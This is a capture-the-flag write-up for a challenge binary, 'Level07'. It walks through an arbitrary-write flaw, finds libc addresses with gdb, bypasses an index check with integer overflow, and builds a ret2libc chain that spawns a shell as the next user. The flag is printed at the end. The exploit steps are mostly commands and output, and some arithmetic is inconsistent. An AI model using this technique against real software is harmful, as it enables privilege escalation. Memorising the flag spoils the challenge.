# Level07 Write-up

## Introduction

The program takes 3 arguments:
- `store`
- `read`
- `quit`

## Vulnerability

Actually, the goal is to exploit this line:

```c
*(_DWORD *)(buffer_main + 4 * index) = unum;
```

The problem here is that because it makes `4 * index`, it's possible to write everywhere!

So how to write the address of the EIP?

And which address do I want to put inside?

## Anti-Exploitation Measures

The problem in this challenge is this code:

```c
for (; *argv_local != (char *)0; argv_local++) {
  memset(*argv_local, 0, strlen(*argv_local));
}
for (; *env_local != (char *)0x0; env_local++) {
  memset(*env_local, 0, strlen(*env_local));
}
```

It deletes every environment variable and every argument.

For this reason, the only possible exploit is to use ret2libc.

## Ret2libc Technique

This is a technique that uses the already existing stuff inside libc for a custom exploit.

I used this website to find how to use ret2libc:
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc

## Finding Required Addresses

So what addresses do I need:

### System Address

```gdb
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

The address of system is `0xf7e6aed0`.

### Exit Address

```gdb
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
```

And the address of exit is `0xf7e5eb70`.

### /bin/sh String Address

The last thing is where is the address of the string `/bin/bash` or `/bin/sh`.

The solution is to look inside the mapping of libc:

```gdb
info proc mapping
```

And after that, look in the range inside the mapping:

```gdb
(gdb) info proc mapping
process 1767
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fd8000 0xf7fdb000     0x3000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

So here the address of the start and the end is known:

```gdb
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```

The address is `0xf7f897ec`.

## Summary of Addresses

- Address string `/bin/sh`: `0xf7f897ec`
- Address exit: `0xf7e5eb70`
- Address of system: `0xf7e6aed0`

## Stack Layout

So now I know which value I need to put, but where?

So the first argument is on:

- Base of the stack for the return address: here `EBP + 4` to overwrite the EIP address
- After that, I need the address of the return: here the next `EBP + 8`
- After that, I need the address of the first argument for system: here `EBP + 12`

So:
- `system` -> `$ebp + 4`
- `exit` -> `$ebp + 8`
- `/bin/sh` -> `$ebp + 12`

```gdb
(gdb) x/x $ebp + 4
0xffffd71c:     0xf7e45513

(gdb) x/x $ebp + 8
0xffffd720:     0x00000001

(gdb) x/x $ebp + 12
0xffffd724:     0xffffd7b4
```

## Finding the Buffer Address

The last element is I need the index, so how to know the address:

So I look at the source code in assembly:

```assembly
lea     eax, [esp+36]
mov     [esp], eax
call    store_number
```

So the buffer is at address `esp+36`.

```gdb
(gdb) x/x $esp+0x24
0xffffd554:     0x00000000
```

## Calculating Indexes

So now I just need to subtract with the value I want:

```
0xffffd71c - 0xffffd554 =  0x1c8 / 4 = > 114  for $ebp+4  system
0xffffd720 - 0xffffd554 =  0x1cc / 4 = > 115  for $ebp+8  exit
0xffffd724 - 0xffffd554 =  0x1d0 / 4 = > 116  for $ebp+12 argument
```

With values:
- Address of system: `0xf7e6aed0` VALUE `4159090384`
- Address exit: `0xf7e5eb70` VALUE `4159040368`
- Address string `/bin/sh`: `0xf7f897ec` VALUE `4160264172`

## Testing

Let's try:

```
 Number: 4160264172
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: 
```

But I found this error!

## Bypassing the Index Check

So actually, it makes `* 4`, so it just makes a bit shift left of 2.

So `*4` is the same as `<<2`.

So just make the number with a negative integer by adding one bit on bit 32.

So `114 / 4` is now `2147483762`.

Same for the rest:

```
2147483762   -> 4159090384
115          -> 4159040368
116          -> 4160264172
```

## Exploitation

```
Input command: store 
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
```

## Flag

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
